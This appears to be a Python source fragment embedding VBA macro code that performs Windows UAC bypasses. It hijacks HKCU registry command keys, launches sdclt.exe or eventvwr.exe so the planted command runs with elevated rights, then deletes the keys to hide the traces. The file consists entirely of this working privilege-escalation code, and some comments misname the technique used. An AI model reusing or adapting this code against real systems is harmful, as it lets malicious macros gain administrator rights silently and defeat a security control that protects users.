



VBA = \
r'''

Private Sub BypassUAC_Windows10 (targetPath As String)
    'Escape VBdevelop protection
    Set wshUac = CreateObject("WScript.Shell")
    
    ' HKCU\Software\Classes\Folder
    regKeyCommand = "HKCU\Software\Classes\Folder\Shell\Open\Command\"
    regKeyCommand2 = "HKCU\Software\Classes\Folder\Shell\Open\Command\DelegateExecute"
    ' Create keys
    wshUac.RegWrite regKeyCommand, targetPath, "REG_SZ"
    wshUac.RegWrite regKeyCommand2, "", "REG_SZ"
    
    'trigger the bypass
    ExecuteCmdAsync  "C:\windows\system32\sdclt.exe"  
    MySleep 3
    
    ' Remove keys
    wshUac.RegDelete  "HKCU\Software\Classes\Folder\Shell\Open\Command\"
    wshUac.RegDelete  "HKCU\Software\Classes\Folder\Shell\Open\"
    wshUac.RegDelete  "HKCU\Software\Classes\Folder\Shell\"
    wshUac.RegDelete  "HKCU\Software\Classes\Folder\"
End Sub



Private Sub BypassUAC_Other(targetPath As String)
    'Escape VBdevelop protection
    Set wshUac = CreateObject("WScript.Shell")
    
    ' HKCU\Software\Classes\ms-settings
    regKeyCommand = "HKCU\Software\Classes\mscfile\Shell\Open\Command\"
    ' Create keys
    wshUac.RegWrite regKeyCommand, targetPath, "REG_SZ"
    
    'trigger the bypass
    ExecuteCmdAsync  "C:\windows\system32\eventvwr.exe"  
    MySleep 3
    
    ' Remove keys
    wshUac.RegDelete  "HKCU\Software\Classes\mscfile\Shell\Open\Command\"
    wshUac.RegDelete  "HKCU\Software\Classes\mscfile\Shell\Open\"
    wshUac.RegDelete  "HKCU\Software\Classes\mscfile\Shell\"
    wshUac.RegDelete  "HKCU\Software\Classes\mscfile\"
End Sub


Private Sub BypassUAC (targetPath As String)
    If GetOSVersion() = "Windows 10" Then
        BypassUAC_Windows10 targetPath
    Else
        BypassUAC_Other targetPath
    End If
End Sub


' hijack ms-settings class com object to bypass UAC when fodhelper.exe is called (Windows 10)
Sub BypassUACExec (targetPath As String)

    'Check if useful to bypass UAC (must be member of Admin group and not have admin privilege
    ' is a member of that group.
    If IsAdmin  () Then
        ExecuteCmdAsync targetPath
    Else
        If IsMember("Administrators") or IsMember("Administrateurs") Then
               BypassUAC targetPath
            Else
               ExecuteCmdAsync targetPath
        End If
    End If

End Sub




'''